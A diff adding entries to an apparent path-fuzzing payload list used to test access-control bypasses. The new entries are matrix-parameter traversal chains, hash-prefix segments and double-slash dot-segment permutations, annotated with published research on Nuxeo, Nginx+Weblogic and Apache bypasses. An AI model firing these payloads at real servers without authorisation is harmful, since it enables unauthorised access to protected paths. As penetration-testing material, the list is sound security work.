@@ -628,6 +628,44 @@
 [h]bar/..
 [h]1/..
 
+# Composite matrix-param + traversal chains (Orange Tsai BH 2018: Amazon
+# Nuxeo RCE chain used /nuxeo/login.jsp;/..;/create_file.xhtml; Uber and
+# Bynder used /status/..;/... and /..;/railo-context/...). Our earlier
+# [h]x;/..  and  [h]..;/ are separate; these are the combined shape where
+# the ACL sees the sacrificial prefix and the container normalizes both
+# matrix params in one pass.
+[h]x;/..;/
+[h]..;/..;/
+[h]x/..;/
+[h]x;/..;/..;/
+[h]x;a=1/..
+[h]x;a=1/..;b=2
+
+# Multi-segment matrix (Orange Tsai BH 2018: /login;foo/bar;quz —
+# ACL sees /login, servlet container sees /login/bar). Sacrificial chain
+# with matrix params on two consecutive placeholder segments.
+[h]x;a=1/y;b=2/..
+[h]x;foo/y;bar/..
+
+# Hash-prefix sacrificial segment (Tiurin ZeroNights 2018: Nginx + Weblogic).
+# Nginx treats '#' as fragment and parses path as /, but resends the URL
+# unprocessed. Weblogic accepts '#' as an ordinary path byte and normalizes
+# the traversal, landing on the protected path. Same bug shape also seen on
+# some CDN + origin combinations where the CDN is more permissive.
+[h]#/..
+[h]#/../
+[h]#/..;/
+[h]x#/..
+[h]x#/../
+
+# Double-slash + dot-segment combos (Tiurin: Apache rewrite bypass shapes
+# like /x/..//target and /x//./../target). [h]x//../ is already above;
+# these add the remaining permutations.
+[h]x//./..
+[h]x//.//..
+[h]x/.//..
+[h]x/.//../
+
 # WAF-whitelist prefixes (common AuthZ-exempt paths on many frameworks)
 [h]static/..
 [h]static/../
